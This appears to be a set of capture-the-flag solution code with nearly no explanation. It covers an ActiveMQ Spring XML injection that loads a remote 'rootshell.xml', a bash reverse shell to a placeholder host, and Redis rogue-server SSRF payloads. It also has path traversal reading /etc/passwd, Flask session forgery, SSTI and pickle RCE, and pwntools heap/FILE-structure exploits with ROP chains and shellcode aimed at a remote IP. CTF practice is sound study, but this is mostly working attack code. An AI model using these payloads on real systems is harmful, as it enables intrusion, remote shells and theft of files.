<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd">

    <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>

    <bean class="java.lang.String">
        <property name="String" value="#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval(&quot;
function getunsafe() {
 var unsafe = java.lang.Class.forName('sun.misc.Unsafe')
  .getDeclaredField('theUnsafe');
 unsafe.setAccessible(true);
 return unsafe.get(null);
}
var unsafe = getunsafe();
brokerRegistry = org.apache.activemq.broker.BrokerRegistry.getInstance();
brokers = brokerRegistry.getBrokers();
for (key in brokers) {
 brokerService = brokers.get(key);
 try {
  f = brokerService.getClass()
   .getDeclaredField('shutdownHook');
 } catch (e) {
  f = brokerService.getClass()
   .getSuperclass()
   .getDeclaredField('shutdownHook');
 }
 f.setAccessible(true);
 shutdownHook = f.get(brokerService);
 threadGroup = shutdownHook.getThreadGroup();
 f = threadGroup.getClass()
  .getDeclaredField('threads');
 threads = unsafe.getObject(threadGroup, unsafe.objectFieldOffset(f));
 for (key in threads) {
  thread = threads[key];
  if (thread == null) {
   continue;
  }
  threadName = thread.getName();
  if (threadName.startsWith('ActiveMQ Transport: ')) {
   f = thread.getClass()
    .getDeclaredField('target');
   tcpTransport = unsafe.getObject(thread, unsafe.objectFieldOffset(f));
   f = tcpTransport.getClass()
    .getDeclaredField('socket');
   f.setAccessible(true);
   socket = f.get(tcpTransport);
   bos = new java.io.ByteArrayOutputStream();
   dataOutput = new java.io.DataOutputStream(bos);
   dataOutput.writeInt(1);
   dataOutput.writeByte(31);
   bs = new org.apache.activemq.openwire.BooleanStream();
   bs.writeBoolean(true);
   bs.writeBoolean(true);
   bs.writeBoolean(true);
   bs.writeBoolean(false);
   bs.writeBoolean(true);
   bs.writeBoolean(false);
   bs.marshal(dataOutput);
   dataOutput.writeUTF('bb');
   dataOutput.writeUTF('aa');
   dataOutput.writeUTF('org.springframework.context.support.ClassPathXmlApplicationContext');
   dataOutput.writeUTF('http://vpsip:8089/rootshell.xml');
   dataOutput.writeShort(0);
   socketOutputStream = socket.getOutputStream();
   socketOutputStream.write(bos.toByteArray());
  }
 }
}
        &quot;)}"/>
    </bean>
</beans>
```



```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/vpsip/2334 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```



```
<?php
highlight_file(__file__);

class Rd
{
    public $ending;
    public $cl;
    public $poc;
}

class Poc
{
    public $payload;
    public $fun;
}

class Er
{
    public $symbol;
    public $Flag;
}

class Ha
{
    public $start;
    public $start1;
    public $start2;
}

$a = new Ha;
$a->start1 = new Rd;
$a->start2 = "o.0";
$a->start = ["POC"=>"0.o"];
$a->start1->cl = new Er;
$payload0 = "dict";
$payload1 = "dict://127.0.0.1:6379/config:set:dir:/tmp";
$payload2 = "dict://127.0.0.1:6379/config:set:dbfilename:exp.so";
$payload3 = "dict://127.0.0.1:6379/slaveof:ip:port";
$payload4 = "dict://127.0.0.1:6379/module:load:/tmp/exp.so";
$payload5 = "dict://127.0.0.1:6379/slave:no:one";
$payload6 = "dict://127.0.0.1:6379/system.exec:env";
$payload7 = "dict://127.0.0.1:6379/module:unload:system";
$c = base64_encode($payload1);
$a->start1->cl->Flag = $c;
echo serialize($a);
?>
```



```
python3 redis-rogue-server.py --server-only
```



```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Register</title>
</head>
<body>
    <h1>Register</h1>
    <form action="register.php" method="post">
        <div>
            <label for="username">用户名:</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div>
            <label for="username">密&emsp;码:</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">注册</button>
    </form>
<!-- You can only register 2 users,otherwise all registered users(except admin) will be cleared to register new ones. -->
</body>
</html>
```



```
Login success! <a href='/'>Click here to redirect.</a>
```



```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Picup</title>
</head>
<body>
    <h1>Pic Upload</h1>
    <form action="/" method="post" enctype="multipart/form-data">
        <div>
            <label for="file">文件：</label>
            <input type="file" name="file" id="file">
        </div>
        <button type="submit">上传</button>
    </form>
    <code>Please upload a valid file!</code>
    <!-- The web administrator clears all uploaded files every 10 minutes -->
    <!-- You can only upload 4 files,otherwise all uploaded files will be cleared to upload new ones. -->
</body>
</html>
```



```
File upload success! Path: <a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a>.
```



```
<h1>files in ./uploads/</h1><br><a href='pic.php?pic=TenMap1e.txt'>./uploads/TenMap1e.txt</a><br>
```



```
<img src="data:image/png;base64,VGVuTWFwMWU=">
```



```
?pic=..././..././etc/passwd
```



```
<img src="data:image/png;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmN0Zjp4Ojk5OTo5OTk6Oi9ob21lL2N0ZjovYmluL3NoCg==">
```



```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
ctf:x:999:999::/home/ctf:/bin/sh
```



```
?pic=..././..././app/app.py
```



```
#app.py
import os
import pickle
import base64
import hashlib
from flask import Flask,request,session,render_template,redirect
from Users import Users
from waf import waf

users=Users()

app=Flask(__name__)
app.template_folder="./"
app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()

@app.route('/',methods=['GET','POST'])
@app.route('/index.php',methods=['GET','POST'])
def index():
    if not session or not session.get('username'):
        return redirect("login.php")
    if request.method=="POST" and 'file' in request.files and (filename:=waf(request.files['file'])):
        filepath=os.path.join("./uploads",filename)
        request.files['file'].save(filepath)
        return "File upload success! Path: <a href='pic.php?pic="+filename+"'>"+filepath+"</a>."
    return render_template("index.html")

@app.route('/login.php',methods=['GET','POST'])
def login():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and users.login(username,password):
            session['username']=username
            return "Login success! <a href='/'>Click here to redirect.</a>"
        else:
            return "Login fail!"
    return render_template("login.html")

@app.route('/register.php',methods=['GET','POST'])
def register():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password):
            return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
        else:
            return "Register fail!"
    return render_template("register.html")

@app.route('/pic.php',methods=['GET','POST'])
def pic():
    if not session or not session.get('username'):
        return redirect("login.php")
    if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
        if session.get('username')=="admin":
            return pickle.load(open(filepath,"rb"))
        else:
            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
    res="<h1>files in ./uploads/</h1><br>"
    for f in os.listdir("./uploads"):
        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```



```
#Users.py
import hashlib

class Users:
    passwords={}

    def register(self,username,password):
        if username in self.passwords:
            return False
        if len(self.passwords)>=3:
            for u in list(self.passwords.keys()):
                if u!="admin":
                    del self.passwords[u]
        self.passwords[username]=hashlib.md5(password.encode()).hexdigest()
        return True

    def login(self,username,password):
        if username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():
            return True
        return False
```



```
#waf.py
import os
from werkzeug.utils import secure_filename

def waf(file):
    if len(os.listdir("./uploads"))>=4:
        os.system("rm -rf /app/uploads/*")

    content=file.read().lower()
    if len(content)>=70:
        return False

    for b in [b"n",b"r",b"\",b"base",b"builtin",b"code",b"command",b"eval",b"exec",b"flag",b"global",b"os",b"output",b"popen",b"pty",b"repeat",b"run",b"setstate",b"spawn",b"subprocess",b"sys",b"system",b"timeit"]:
        if b in content:
            return False

    file.seek(0)
    return secure_filename(file.filename)
```



```
return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
```



```
app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()
```



```
if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
 if session.get('username')=="admin":
  return pickle.load(open(filepath,"rb"))
    else:
  return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
```



```
python flask_session_cookie_manager3.py encode -s "5fa7397bae81174237f01f64c165299c" -t "{'username':'admin'}"
```



```
eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA
```



```
app.template_folder="./"
```



```
{{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}
```



```
import pickle
from flask import render_template

class EXP():
    def __reduce__(self):
        return(render_template,("uploads/poc",))

exp=EXP()
f=open("exp","wb")
pickle.dump(exp,f)
```



```
GET /pic.php?pic=exp HTTP/1.1
Host: localhost
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA
Content-Length: 39

__import__('os').popen('whoami').read()
```



```
cat /flag > flag
```



```
from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./nmanager")
elf=ELF("./nmanager")
libc=elf.libc

ret=0x40101a

def modify(n,gd,age,name):
    io.sendlineafter(b"modify ##n",str(n))
    io.sendafter(b"gender: ",gd)
    io.sendlineafter(b"age: ",str(age))
    io.sendafter(b"name: ",name)

def choice(n):
    if n == 0:
        io.sendafter(b"quit now?(Y/y)n",b"n")
    else:
        io.sendafter(b"quit now?(Y/y)n",b"y")
        

payload=b"./flagx00x00"+cyclic(0x58)+b"check passed".ljust(0x20,b"x00")
io.sendlineafter(b"password: ",payload)

## leak libc
modify(8,b"aaaaaaaa",0x10,b"www")
io.recvuntil(b"aaaaaaaa")
leak_addr=u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00"))-0x29d90
print("leak_addr: ",hex(leak_addr))

pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
sys_addr=leak_addr+libc.sym[b"system"]
choice(0)
### leak canary
modify(-1,b"a",0x10,b"www")
io.recvuntil(b"gender: a")
canary=u64(io.recv(7).rjust(8,b"x00"))
print("canary: ",hex(canary))
choice(0)
### rop
payload=p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)
modify(-1,payload,str_sh,p64(sys_addr))
choice(1)
io.interactive()
```



```
_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
 _wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
 _wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
 _wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
 _wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
```



```
# coding=utf-8
from pwn import *
p=process('./pwn')
#p=remote("0.0.0.0",10003)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
context(arch='amd64', os='linux', log_level='debug')
s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims      :p.recvuntil(delims)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,' '))
uu64    = lambda data               :u64(data.ljust(8,' '))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(p)

def add(index, size):
    sla('> ', '1')
    sla(':', str(index))
    sla(':', str(size))

def delete(index):
    sla('> ', '2')
    sla(':', str(index))
def edit(index, content):
    sla('> ', '4')
    sla(':', str(index))
    sla(': ', content)
def show(index):
    sla('> ', '3')
    sla(':', str(index))
def dbg():
    gdb.attach(p)
    pause()

add(0,0x420)
add(1,0x20)
add(2,0x30)
delete(0)
show(0)
libc_base =u64(ru('x7f')[-6:].ljust(8, b'x00'))  -0x219ce0
lg('libc_base ' , (libc_base))
delete(1)
show(1)
key = u64(r(5).ljust(8, b'x00'))
heap_base = key << 12
lg('heap_base ',(heap_base))

add(0,0x420)
add(1,0x20)
for i in range(3,12):
    add(i, 0x60)
for i in range(3,11):
    delete(i)
delete(11)
delete(10)
for i in range(3,10):
    add(i, 0x60)
add(13,0x60)
edit(13,p64(key ^ (libc_base + libc.sym['_IO_list_all'])))
add(14,0x60)
add(15,0x60)
target = heap_base + 0xb30 
add(16, 0x60)
edit(16,p64(target))
payload = p64(0)*5+ p64(123)+p64(0)*14+ p64(target + 0xe0)+p64(0)*6+ p64(libc_base + libc.sym['_IO_wfile_jumps'])+p64(0)*28+ p64(target + 0x1A8)
add(17, 0x200)
 
edit(17,payload)
 
one_gadget = [0x50a47, 0xebc81, 0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]
add(18, 0x10)
edit(18,p64(one_gadget[2] + libc_base))
dbg()
sla('> ', '5')

itr()
'''
exit==>__run_exit_handlers==>_IO_cleanup==>_IO_flush_all_lockp==>_IO_wfile_overflow==>_IO_wdoallocbuf
'''
```



```
void draw() {
    char buf[0x100];
    if(magic || !dev || !name) {
        puts("wrong.");
        return;
    }
    size_t addr, length;
    printf("offset> ");
    addr = getint();
    printf("length> ");
    length = getint();
    if(length < 0 || length > 8) {
        puts("wrong.");
        return;
    }
    fread(0x114514000+addr, 1, 1, dev);
    magic = 1;
}
```



```
int init() {
    size_t tmp1 = stdin;
    setbuf(tmp1, 0);
    size_t tmp2 = stdout;
    setbuf(tmp2, 0);
    size_t tmp3 = stderr;
    setbuf(tmp3, 0);
}

size_t getint(){
    size_t tmp;
    scanf("%lld", &tmp);
    return tmp;
}

choice = getint();
switch (choice){
 ...
    default:
        printf("invalid option %ld.n", choice);
        break;
}
```



```
from pwn import *
import time
# context.arch = "amd64"

class HouseOfSome:
    def __init__(self, libc: ELF, controled_addr, zero_addr) -> None:
        self.libc = libc
        self.controled_addr =controled_addr
        self.READ_LENGTH_DEFAULT = 0x400
        self.LEAK_LENGTH = 0x500
        self.zero_addr = zero_addr

        self.fake_wide_data_template = lambda : flat({
            0x18: 0,
            0x20: 1,
            0x30: 0,
            0xE0: self.libc.symbols['_IO_file_jumps'] - 0x48,
        }, filler=b"x00")

        self.fake_file_read_template = lambda buf_start, buf_end, wide_data, chain, fileno: flat({
            0x00: 0, # _flags
            0x20: 0, # _IO_write_base
            0x28: 0, # _IO_write_ptr
            
            0x38: buf_start, # _IO_buf_base
            0x40: buf_end, # _IO_buf_end
            
            0x70: p32(fileno), # _fileno
            0x82: b"x00", # _vtable_offset
            0x88: self.zero_addr,
            0xc0: 2, # _mode
            0xa0: wide_data, # _wide_data
            0x68: chain, # _chain
            0xd8: self.libc.symbols['_IO_wfile_jumps'], # vtable
        }, filler=b"x00")

        self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
            0x00: 0x800 | 0x1000, # _flags
            
            0x20: buf_start, # _IO_write_base
            0x28: buf_end, # _IO_write_ptr

            0x70: p32(fileno), # _fileno
            0x68: chain, # _chain
            0x88: self.zero_addr,
            0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
        }, filler=b"x00")

        self.wide_data_length = len(self.fake_wide_data_template())
        self.read_file_length = len(self.fake_file_read_template(0, 0, 0, 0, 0))
        self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))

    def next_control_addr(self, addr, len):
        return addr + len
    
    def read(self, fd, buf, len, end=0):
        addr = self.controled_addr
        f_read_file_0 = self.fake_file_read_template(buf, buf+len, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) 
        f_wide_data = self.fake_wide_data_template()
        addr += self.read_file_length + self.wide_data_length
        self.controled_addr = self.next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * 2)
        f_read_file_1 = self.fake_file_read_template(self.controled_addr, 
                                                     self.controled_addr+self.READ_LENGTH_DEFAULT, 
                                                     addr+self.read_file_length, 
                                                     0 if end else self.controled_addr, 
                                                     0) 
        payload = flat([
            f_read_file_0,
            f_wide_data,
            f_read_file_1,
            f_wide_data
        ])
        assert b"n" not in payload, "\n in payload."
        return payload
    
    def write(self, fd, buf, len):
        addr = self.controled_addr
        f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
        addr += self.write_file_length
        f_wide_data = self.fake_wide_data_template()
        self.controled_addr = self.next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)
        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, 0) 
        
        payload = flat([
            f_write_file,
            f_read_file_1,
            f_wide_data
        ])
        assert b"n" not in payload, "\n in payload."
        return payload
    
    def bomb(self, io: tube, retn_addr):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        log.success(f"retn_addr : {retn_addr:#x}")
        buf = io.recv(self.LEAK_LENGTH)
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300)
        io.sendline(payload)

        rop = ROP(self.libc)
        rop.base = stack_leak - self.LEAK_LENGTH + offset
        rop.call('execve', [b'/bin/sh', 0, 0])
        log.info(rop.dump())
        rop_chain = rop.chain()
        assert b"n" not in rop_chain, "\n in rop_chain"
        io.sendline(rop_chain)

    def bomb_raw(self, io: tube, retn_addr):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        log.success(f"retn_addr : {retn_addr:#x}")
        buf = io.recv(self.LEAK_LENGTH)
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300, end=1)
        io.sendline(payload)

        return stack_leak - self.LEAK_LENGTH + offset
    

if __name__ == "__main__":
    # libc = ELF("./libc-2.38.so.6")
    context.arch = 'amd64'
    libc = ELF("./libc.so.6", checksec=None)
    # libc.address = 0x100000000000
    # print(hex(libc.bss()))
    # print(libc.maps)
    # for k, v in libc.symbols.items():
    #     print(k, hex(v))
    code = libc.read(libc.symbols['_IO_file_underflow'], 0x200)
    print(code)
    tmp = disasm(code)
    print(tmp)
```



```
from pwn import *
from House_of_some import HouseOfSome

context.log_level = 'debug'
context.arch = 'amd64'

# shellcode = asm(
# f"""
# mov rax, {u64(b"/bin/sh"+bytearray([0]))}
# push rax
# mov rdi, rsp
# mov rsi, 0
# mov rdx, 0
# mov rax, 59
# syscall
# """)

shellcode = asm(
f"""
mov rax, {u64(b"./flag" + bytearray([0,0]))}
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x40
mov rax, 0
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x40
mov rax, 1
syscall
""")

# io = process("./houseofsome")
# io = remote("127.0.0.1", 9999)
io = remote("39.106.48.123", 25077)
tob = lambda x: str(x).encode()

def name(size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size> ", tob(size))
    io.sendafter(b"name> ", content)

def dev(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"dev> ", tob(idx))
    
def draw(offset, length):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"offset> ", tob(offset))
    io.sendlineafter(b"length> ", tob(length))

def leave():
    io.sendlineafter(b"> ", b"5")

io.sendlineafter(b"> ", b"-")
io.recvuntil(b"invalid option ")
leak = int(io.recvuntil(b".", drop=True))
log.success(f"leak : {leak:#x}")
libc_base = leak - 0x2207a0
log.success(f"libc_base : {libc_base:#x}")

libc = ELF("./libc.so.6", checksec=None)
libc.address = libc_base
# dev(1)

name(0x2b0-1, flat({
    0x260: {
        0x18: 0,
        0x20: 1,
        0x30: 0,
    }
}, filler=b"x00") + b"n")
name(0x1f00-0x730-1, b"aa" + b"n")
name(0x400-1, b"aa" + b"n")
name(0x590-1, flat({
    0xe0-0x60: libc.symbols['_IO_file_jumps'] - 0x48
}, filler=b"x00") + b"n")
name(0x50-1, b"aa" + b"n")
name(0x600-1, b"aa" + b"n")
name(0x610-1, b"aa" + b"n")
name(0x300-1, b"aa" + b"n")
name(0x2f0-1, b"aa" + b"n")
name(0x360-1, b"aa" + b"n")
name(0x210-1, b"aa" + b"n")
# name(0x80-1, b"aa" + b"n")

environ = libc.symbols['__environ']

name(0xb0-1, flat({
    0x00: 0, # _flags
    0x20: 0, # _IO_write_base
    0x28: 0, # _IO_write_ptr
    
    0x38: environ+8, # _IO_buf_base
    0x40: environ+8+0x400, # _IO_buf_end
 
    0x70: 0, # _fileno
    0x68: environ+8, # _chain
    0x82: b"x00", # _vtable_offset
    0x88: environ-0x10,
    0xa0: b"n"
}, filler=b"x00"))

name(0x20-1, flat({
    0xc0-0x20-0xa0: 2, # _mode
    0xd8-0x20-0xa0: libc.symbols['_IO_wfile_jumps'], # vtable
}, filler=b"x00")[:-1] + b"n")

dev(2)
draw(libc.symbols["_IO_list_all"] - 0x114514000, 1)
leave()

hos = HouseOfSome(libc, environ+8, environ-0x10)

stack = hos.bomb_raw(io, libc.symbols["_IO_flush_all"] + 481)
log.success(f"stack : {stack:#x}")

pop_rdx = 0x0000000000096272 + libc_base

rop = ROP(libc)
rop.base = stack
# print(rop.gadgets)
# print(rop.rdx)
rop.raw(pop_rdx)
rop.raw(7)
rop.call('mprotect', [stack & (~0xfff), 0x1000])
rop.raw(stack + 0x40)
log.info(rop.dump())
rop_chain = rop.chain()

# gdb.attach(io, gdbscript=
# """
# # b free
# # b malloc
# # c
# # b *(_IO_flush_all+341)
# # c
# b mprotect
# c
# """,api=True)

assert b"n" not in rop_chain, "\n in rop_chain"
io.sendline(rop_chain + shellcode)

context.log_level = 'info'
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/10-1706270282.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/5-1706270283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/2-1706270283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/4-1706270283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1706270284.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/3-1706270284.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/6-1706270284.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/8-1706270285.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/1-1706270285.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1706270285.png)